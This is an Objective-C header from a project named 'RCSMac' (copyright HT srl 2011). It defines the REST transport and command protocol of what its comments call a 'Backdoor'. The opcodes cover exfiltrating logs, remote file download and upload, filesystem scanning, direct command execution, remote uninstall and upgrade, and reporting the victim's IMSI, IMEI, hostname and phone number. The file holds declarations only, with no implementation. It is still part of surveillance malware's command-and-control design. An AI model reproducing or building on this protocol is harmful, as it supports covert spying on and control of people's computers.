/*
 * RCSMac - RESTTransport
 *  Transport implementation for REST Protocol.
 *
 *
 * Created on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

//#import <Cocoa/Cocoa.h>
#import "Transport.h"

#pragma mark -
#pragma mark Transfer Protocol Definition
#pragma mark -

// Transfer Protocol Parameters
#define PROTO_INVALID     0x00
#define PROTO_OK          0x01
#define PROTO_NO          0x02  // Command failed
#define PROTO_BYE         0x03  // Closing connection
#define PROTO_CHALLENGE   0x04  // Challenge, need to encrypt 16 bytes
#define PROTO_RESPONSE    0x05  // Response, 16 bytes encrypted
#define PROTO_SYNC        0x06  // Send Logs
#define PROTO_NEW_CONF    0x07  // New configuration available big "nBytes"
#define PROTO_LOG_NUM     0x08  // Gonna send "nLogs"
#define PROTO_LOG         0x09  // Log big "nBytes"
#define PROTO_UNINSTALL   0x0A  // Uninstall
#define PROTO_RESUME      0x0B  // Send me back log "name" starting from "xByte"
#define PROTO_DOWNLOAD    0x0C  // Download - send me file "name" (wchar)
#define PROTO_UPLOAD      0x0D  // Upload - upload file "nane" big "nBytes" to "pathName"
#define PROTO_FILE        0x0E  // Gonna receive a "fileName" big "nBytes"
#define PROTO_ID          0x0F  // Backdoor ID
#define PROTO_INSTANCE    0x10  // Device ID
#define PROTO_USERID      0x11  // IMSI/USERNAME,# unpadded bytes (sent block is padded though)
#define PROTO_DEVICEID    0x12  // IMEI/HOSTNAME,# unpadded bytes (sent block is padded though)
#define PROTO_SOURCEID    0x13  // Phone Number where possible
#define PROTO_VERSION     0x14  // Backdoor version (10 byte)
#define PROTO_LOG_END     0x15  // LogSend did finish
#define PROTO_UPGRADE     0x16  // Upgrade tag
#define PROTO_ENDFILE     0x17  // End of Transmission - file download
#define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype
#define PROTO_FILESYSTEM  0x19  // List of paths to be scanned
#define PROTO_PURGE       0x1a  // Elimina i file di log vecchi o troppo grossi
#define PROTO_COMMANDS    0x1b  // Esecuzione diretta di comandi

@interface RESTTransport : Transport <Transport>
{
@private
  NSURL *mURL;
  int32_t mPort;
  NSString *mCookie;
}

- (id)initWithURL: (NSURL *)aURL
           onPort: (int32_t)aPort;

- (void)dealloc;

- (NSData *)sendData: (NSData *)aPacketData
   returningResponse: (NSURLResponse *)aResponse;

@end
